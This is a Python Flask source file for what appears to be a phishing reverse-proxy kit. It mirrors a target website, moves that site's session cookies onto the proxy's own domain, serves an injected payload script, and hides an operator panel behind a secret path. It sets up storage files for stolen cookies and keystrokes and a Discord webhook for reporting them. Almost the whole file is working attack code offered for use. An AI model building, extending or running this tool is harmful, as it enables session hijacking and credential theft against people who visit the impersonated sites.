from flask import Flask, request, Response, send_from_directory, jsonify
import requests
import json
import os
from datetime import datetime
from core.database import Database
from core.detection import DataDetector
from core.discord_bot import DiscordBot
from colorama import Fore
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize components
db = Database()
detector = DataDetector()
discord_bot = None

def initialize_discord_bot():
    global discord_bot
    settings = db.get_discord_settings()
    if settings['discord_webhook'] and settings['discord_token']:
        try:
            discord_bot = DiscordBot(settings['discord_webhook'], settings['discord_token'])
            print(f"{Fore.GREEN}[+] Discord bot initialized successfully!{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[!] Discord bot initialization failed: {str(e)}{Fore.RESET}")

def ensure_json_files():
    files = ['cookies.json', 'keylogs.json']
    for file in files:
        if not os.path.exists(file):
            with open(file, 'w') as f:
                json.dump([], f)

ensure_json_files()
initialize_discord_bot()

def start_proxy(target, host, port, secret):
    app = Flask(__name__, static_folder='panel', static_url_path='')
    
    # Create a session for reuse
    session = requests.Session()
    session.verify = False

    @app.route(f'/{secret}')
    def panel_index():
        return send_from_directory('panel', 'index.html')

    @app.route(f'/{secret}/<path:filename>')
    def panel_files(filename):
        return send_from_directory('panel', filename)

    @app.route('/payload-script.js')
    def serve_payload():
        return send_from_directory('.', 'payload-script.js')

    @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
    @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
    def proxy(path):
        if path.startswith(secret):
            if path == secret:
                return panel_index()
            filename = path[len(secret)+1:]
            return panel_files(filename)

        try:
            # Build target URL
            target_url = f"https://{target}/{path}"
            if request.query_string:
                target_url += f"?{request.query_string.decode()}"

            print(f"{Fore.CYAN}[*] Proxying request to: {target_url}{Fore.RESET}")

            # Prepare headers
            headers = dict(request.headers)
            excluded_headers = ['host', 'content-length']
            headers = {k: v for k, v in headers.items() if k.lower() not in excluded_headers}
            headers['Host'] = target

            # Forward the request with original data
            resp = session.request(
                method=request.method,
                url=target_url,
                headers=headers,
                data=request.get_data(),
                cookies=request.cookies,
                allow_redirects=True,
                verify=False,
                timeout=30
            )

            # Create response with original status code
            response = Response(
                resp.content,
                resp.status_code,
                [(k, v) for k, v in resp.headers.items() 
                 if k.lower() not in ['content-encoding', 'content-length', 'transfer-encoding']]
            )

            # Copy all cookies from response
            for cookie in resp.cookies:
                response.set_cookie(
                    key=cookie.name,
                    value=cookie.value,
                    domain=request.host,
                    path='/',
                    secure=cookie.secure,
                    httponly=cookie.has_nonstandard_attr('HttpOnly')
                )

            return response

        except Exception as e:
            print(f"{Fore.RED}[!] Proxy Error: {str(e)}{Fore.RESET}")
            return str(e), 500

    # Keep your existing API routes here
    @app.route('/ep/api/settings', methods=['GET', 'POST'])
    def handle_settings():
        if request.method == 'POST':
            data = request.json
            db.save_discord_settings(
                data.get('discord_webhook', ''),
                data.get('discord_token', '')
            )
            return jsonify({'status': 'success'}), 200
        else:
            return jsonify(db.get_discord_settings()), 200

    print(f"\n{Fore.GREEN}[+] Panel URL: http://{host}:{port}/{secret}{Fore.RESET}")
    print(f"{Fore.GREEN}[+] Proxy running on http://{host}:{port}/{Fore.RESET}")
    
    app.run(host='0.0.0.0', port=port, threaded=True)